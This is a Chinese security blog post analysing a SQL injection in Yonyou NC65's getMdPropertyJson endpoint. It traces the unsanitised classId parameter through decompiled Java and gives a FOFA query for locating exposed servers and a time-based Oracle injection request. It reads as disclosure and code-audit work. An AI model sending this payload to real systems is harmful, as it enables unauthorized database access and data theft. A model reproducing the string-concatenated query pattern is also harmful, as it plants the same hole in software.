---
title: "用友NC oauidesigner/getMdPropertyJson sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oauidesigner-getMdPropertyJson-classId-sqli.html
asset_dir: assets/用友nc-oauidesignergetmdpropertyjson-sql注入漏洞
---

# 用友NC oauidesigner/getMdPropertyJson sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/14 08:12
- 1205浏览
- [0评论](#comment)
- 59分钟阅读

深入探索

软件

sql

服务器

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用 /portal/pt/oauidesigner/getMdPropertyJson 接口中的 classId 参数实现sql注入，从而窃取服务器的敏感信息。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 getMdPropertyJson 接口

[![用友NC oauidesigner/getMdPropertyJson sql注入漏洞](images/img-001-e6880dcea571.webp)](https://image.mrxn.net/78060e5297ce483b8985335d7604203d.webp)

因此搜索 getMdPropertyJson 方法的实现部分即可定位文件

代码安全审计

nc/bs/oa/oaff/uidesigner/action/TemplatedesignerAction.class

深入探索

Web安全书籍

云安全解决方案

文件大小转换

```
package nc.bs.oa.oaff.uidesigner.action;

import java.net.URLDecoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CopyOnWriteArrayList;
import nc.bs.framework.common.NCLocator;
import nc.bs.oa.oaff.uidesigner.utils.CommonMethodUtil;
import nc.bs.oa.oaff.uidesigner.utils.FreemarkerUtil;
import nc.bs.oa.oaff.uidesigner.utils.JsonUtil;
import nc.bs.oa.oaff.uidesigner.utils.UICompConfigCacheHelper;
import nc.bs.oa.oaff.utils.mdUtil;
import nc.itf.oa.oaff.oafreeform.manage.IEnumMdManageService;
import nc.itf.oa.oaff.oafreeform.manage.IFormMdManageService;
import nc.itf.oa.oaff.oafreeform.manage.IFormtemplateManageService;
import nc.itf.oa.oaff.oafreeform.query.ICustomCompQueryService;
import nc.itf.oa.oaff.oafreeform.query.ICustomWidgetQueryService;
import nc.itf.oa.oaff.oafreeform.query.IEnumMdQueryService;
import nc.itf.oa.oaff.oafreeform.query.IFormMdQueryService;
import nc.itf.oa.oaff.oafreeform.query.IFormtemplateQueryService;
import nc.itf.oa.oaff.oafreeform.query.IFreeformQueryService;
import nc.uap.cpb.org.exception.CpbBusinessException;
import nc.uap.lfw.core.exception.LfwBusinessException;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.core.log.LfwLogger;
import nc.uap.lfw.file.FileManager;
import nc.uap.lfw.file.vo.LfwFileVO;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.log.PortalLogger;
import nc.vo.oa.oaff.customcomp.CustomCompVO;
import nc.vo.oa.oaff.oacomp.UICompConfig;
import nc.vo.oa.oaff.oatemplate.EnumMdVO;
import nc.vo.oaff.customwidget.CustomWidgetVO;
import nc.vo.oaff.oaformtemplate.OaFormTemplateVO;
import nc.vo.oaff.oafreeformcategory.OaFreeformVO;
import nc.vo.oaff.oafreeformmd.OaFreeformMdVO;
import nc.vo.pub.BusinessException;
import nc.vo.pub.lang.UFDateTime;
import org.apache.commons.lang.StringUtils;
import uap.lfw.dbl.cpdoc.itf.ICpCommomObjectQry;
import uap.lfw.dbl.cpdoc.itf.ICpDocSysAttrQry;
import uap.lfw.dbl.vo.CpDocAttributeVO;
import uap.lfw.dbl.vo.CpDocVO;
import uap.lfw.md.dao.IPropertyVOQuery;
import uap.lfw.md.vo.PropertyVO;
import uap.wap.bd.file.CPFileLockHelper;
import uap.wap.bd.file.CpFileLockVO;
import ufida.fasterxml.jackson.databind.ObjectMapper;

@Servlet(
    path = "/oauidesigner"
)

@Action
public void getMdPropertyJson() throws BusinessException {
    try {
        String mdIdStr = this.getRequest().getParameter("mdIdMap");
        String classId = this.getRequest().getParameter("classId");
        ObjectMapper maper = new ObjectMapper();
        HashMap<String, Integer> mdIdMap = (HashMap)maper.readValue(mdIdStr, HashMap.class);
        mdUtil.setMdIdMap(mdIdMap);
        IPropertyVOQuery propertyVOQuery = (IPropertyVOQuery)NCLocator.getInstance().lookup(IPropertyVOQuery.class);
        PropertyVO[] vos = new PropertyVO[0];

        try {
            vos = propertyVOQuery.getPropertyVOByCondition("classid='" + classId + "' order by ATTRSEQUENCE ");
        } catch (CpbBusinessException e) {
            LfwLogger.error(e.getMessage(), e.getCause());
            throw new LfwRuntimeException(e.getMessage());
        }
```

classId 参数直接拼接在SQL语句后，代入 getPropertyVOByCondition 函数，其实现逻辑如下

漏洞修复方案

```
public PropertyVO[] getPropertyVOByCondition(String condition) throws CpbBusinessException {
    PropertyVO[] propertyvos = null;

    try {
        propertyvos = (PropertyVO[])(new PtBaseDAO()).queryByCondition(PropertyVO.class, condition);
        return propertyvos;
    } catch (DAOException e) {
        CpLogger.error(e.getMessage(), e);
        throw new CpbBusinessException(e.getMessage());
    }
}
```

继续代入 queryByCondition 函数，其实现逻辑如下

计算机服务器

```
public SuperVO[] queryByCondition(Class voClass, String strWhere) throws DAOException {
    if (strWhere != null && strWhere.length() != 0) {
        strWhere = " (isnull(dr,0)=0) and " + strWhere;
    } else {
        strWhere = " (isnull(dr,0)=0) ";
    }

    PersistenceManager manager = null;

    SuperVO[] var5;
    try {
        manager = this.createPersistenceManager(this.dataSource);
        List list = (List)manager.retrieveByClause(voClass, strWhere);
        var5 = (SuperVO[])list.toArray((SuperVO[])Array.newInstance(voClass, 0));
    } catch (DbException e) {
        Logger.error(e.getMessage(), e);
        throw new DAOException(e.getMessage());
    } finally {
        if (manager != null) {
            manager.release();
        }

    }

    return var5;
}
```

strWhere 直接拼接到 and SQL语句后 代入 retrieveByClause 函数

SQL注入防护

继续跟踪 retrieveByClause 函数

```
public Collection retrieveByClause(Class className, String condition) throws DbException {
    return this.retrieveByClause(className, (String)condition, (String[])null);
}

public Collection retrieveByClause(Class className, String condition, String[] fields, SQLParameter parameters) throws DbException {
    BaseProcessor processor = new BeanListProcessor(className);
    return (Collection)this.session.executeQuery(this.buildSql(className, condition, fields), parameters, processor);
}

public Collection retrieveByClause(Class className, String condition, String[] fields) throws DbException {
    return this.retrieveByClause(className, (String)condition, (String[])fields, (SQLParameter)null);
}
```

最终 classId 参数拼接进SQL语句后由 buildSql 函数组装成SQL语句，最终调用 executeQuery 执行上面组合后的SQL语句，造成SQL注入漏洞。

搜索引擎

[![用友NC oauidesigner/getMdPropertyJson sql注入漏洞](images/img-002-d2e23dde263e.webp)](https://image.mrxn.net/f4be200a552149d494d5a66135c58c17.webp)

# 漏洞复现

> 只是示例
>
> 编程

```
GET /portal/pt/oauidesigner/getMdPropertyJson?pageId=login&mdIdMap=1&classId=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',4)-- HTTP/1.1
Host: nc65.mrxn.net
```

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=667`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
